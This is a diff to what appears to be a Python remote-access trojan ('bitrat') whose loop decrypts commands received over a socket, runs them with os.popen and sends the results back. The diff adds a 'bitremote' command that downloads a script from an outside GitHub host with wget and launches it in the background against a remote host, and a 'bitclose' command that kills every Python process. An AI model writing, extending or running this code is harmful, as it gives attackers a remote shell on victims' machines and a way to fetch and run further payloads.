@@ -48,6 +48,11 @@ def main():
   while True:
    data=s.recv(1024)
    cmd=decrypt(data)
+   if cmd=='bitremote':
+     os.system('wget https://raw.githubusercontent.com/X1pe0/bitrat/main/tools/remc.py')
+     os.system('nohup python3 remc.py %s 6969 1000 600 &'%(H))
+   if cmd=='bitclose':
+     os.system('killall python')
    results=os.popen(cmd).read()
    s.sendall(encrypt(results))
  except:
